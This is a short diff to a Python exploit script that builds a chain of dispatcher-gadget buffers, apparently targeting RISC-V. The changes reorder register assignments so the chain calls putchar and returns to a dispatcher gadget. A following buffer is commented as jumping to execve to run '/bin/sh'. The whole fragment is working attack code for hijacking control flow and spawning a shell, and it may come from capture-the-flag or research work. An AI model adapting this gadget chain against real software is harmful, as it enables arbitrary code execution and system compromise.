@@ -83,13 +83,15 @@ buf2.set_a3(load_from_t0)
 
 # This buffer jumps to jalr a5 which then goes to putchar
 buf3 = dispatchBuf(buf2)
+# Jump to gadget which sets the next dispatcher buf
+buf3.set_t1(set_t0_s3_jump_a3)
+# Then jump to putchar
+buf3.set_a3(putchar)
 buf3.set_a0(ord('c'))
+# Return to dispatcher gadget after putchar finishes
+buf3.set_ra(load_from_t0)
 # Set the stack to the second buf ptr as this shouldn't be used anymore
-buf3.set_a3(load_from_t0)
 buf3.set_sp(buf2.dispatch_buf)
-# Jump to gadget which moves to next dispatcher
-buf3.set_ra(set_t0_s3_jump_a3)
-buf3.set_t1(putchar)
 
 # This buffer jumps to execve and executes "/bin/sh"
 buf4 = dispatchBuf(buf3)
